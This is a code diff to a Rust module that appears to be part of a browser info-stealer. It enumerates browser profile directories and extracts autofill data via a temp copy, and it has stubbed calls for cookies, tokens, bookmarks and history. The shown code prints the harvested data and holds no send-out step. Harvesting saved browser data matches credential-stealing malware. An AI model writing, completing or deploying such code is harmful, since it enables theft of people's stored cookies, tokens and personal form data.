@@ -11,16 +11,26 @@ use std::path::PathBuf;
 pub async fn get_browser() {
     let mut browser_root = get_browser_root_paths();
 
-    for entry in browser_root.iter_mut() {
-        cookies::get_cookies(entry).await;
-        // token::get_token(entry);
-        // autofill::get_autofill(entry);
-        // bookmarks::get_bookmarks(entry);
-        // history::get_history(entry);
+    let mut tempfile = if cfg!(target_os = "windows") {
+        PathBuf::from(std::env::var("TEMP").unwrap())
+    } else {
+        PathBuf::from(String::from("/tmp"))
+    };
+    tempfile.push("cat.db");
+
+    for path_entry in browser_root.iter_mut() {
+        if let Ok(profiles) = get_profiles(path_entry).await {
+            // cookies::get_cookies(path_entry, &profiles).await;
+            // token::get_token(path_entry, &profiles).await;
+            let autofills = autofill::get_autofill(path_entry, &profiles, &tempfile).await;
+            println!("{autofills:#?}");
+            // bookmarks::get_bookmarks(path_entry, &profiles).await;
+            // history::get_history(path_entry, &profiles).await;
+        }
     }
 }
 
-pub fn get_browser_root_paths() -> Vec<PathBuf> {
+fn get_browser_root_paths() -> Vec<PathBuf> {
     let mut browser_root;
 
     if cfg!(target_os = "windows") {
@@ -46,10 +56,13 @@ pub fn get_browser_root_paths() -> Vec<PathBuf> {
         ))); // Opera Browser
     } else {
         // for linux
-        browser_root = vec![PathBuf::from(std::env::var("HOME").unwrap()); 7];
+        browser_root = Vec::with_capacity(7);
+        let home = std::env::var("HOME").unwrap();
 
-        browser_root[0].push(".mozilla/firefox"); // Firefox
-        browser_root[1].push(".config/BraveSoftware/Brave-Browser");
+        // browser_root.push(PathBuf::from(format!("{home}/.mozilla/firefox"))); // Firefox
+        browser_root.push(PathBuf::from(format!(
+            "{home}/.config/BraveSoftware/Brave-Browser"
+        )));
         // browser_root[2].push(""); // Chromium
         // browser_root[2].push(""); // Google Chrome
         // browser_root[3].push(""); // Microsoft Edge
@@ -57,9 +70,30 @@ pub fn get_browser_root_paths() -> Vec<PathBuf> {
         // browser_root[6].push(""); // Opera
     }
 
-    // for macos
-    // for android
-    // for ios
-
     browser_root
+}
+
+async fn get_profiles(path: &mut PathBuf) -> std::io::Result<Vec<String>> {
+    // checking if browser is installed or not
+    match tokio::fs::read_dir(&path).await {
+        Ok(mut list) => {
+            let mut profiles = Vec::with_capacity(16);
+            profiles.push("Default".to_string());
+            // loop through all other profiles
+            while let Ok(dir_entry_unknown) = list.next_entry().await {
+                if let Some(dir_entry) = dir_entry_unknown {
+                    if let Some(entry) = dir_entry.file_name().to_str() {
+                        if !entry.contains("Profile") {
+                            continue;
+                        }
+                    }
+                    profiles.push(dir_entry.file_name().into_string().unwrap());
+                } else {
+                    break;
+                }
+            }
+            return Ok(profiles);
+        }
+        Err(e) => return Err(e),
+    }
 }
